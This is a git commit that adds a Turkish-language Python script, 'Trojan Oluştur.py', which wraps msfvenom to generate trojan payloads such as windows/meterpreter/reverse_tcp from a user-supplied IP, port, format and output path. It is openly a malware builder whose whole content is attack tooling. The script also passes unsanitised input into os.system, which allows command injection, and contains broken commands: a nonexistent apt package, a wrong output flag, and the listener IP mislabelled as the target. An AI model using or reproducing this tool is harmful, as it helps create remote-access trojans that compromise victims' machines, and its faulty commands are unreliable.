7d596d1b49e0abf03f222ee5f8e7ba2922597a03
Ugroon <77273551+Ugroon@users.noreply.github.com>
2021-01-21 16:10:26 +0300

    Add files via upload

---
+++ Trojan Oluştur.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import os
+
+os.system("clear")
+os.system("apt install -y msfvenom")
+os.system("apt full-upgrade msfvenom")
+os.system("figlet Trojan Olusturma")
+
+
+print("""
+
+Trojan oluşturma programına hoş geldiniz
+
+""")
+
+ip = input("Hedef ip adresi: ")
+
+port = input("Port numarası: ")
+
+payload = input("Trojan adı(Örneğin windows/meterpreter/reverse_tcp): ")
+
+dosya = input("İşletim sistemine göre dosya türü: ")
+
+kayit = input("Trojanın kayıt edileceği konum: ")
+
+os.system("msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + port + " -f " + dosya + " -O" + kayit)
+
+restart = input("Yeni trojan oluşturmak istermisiniz? (E/h): ")
+
+e = str("E")
+
+if e == restart.upper():
+
+    os.system("python3 Trojan Oluştur.py")
+
+elif restart == "":
+
+    os.system("python3 Trojan Oluştur.py")
+
+
+else:
+
+    exit()
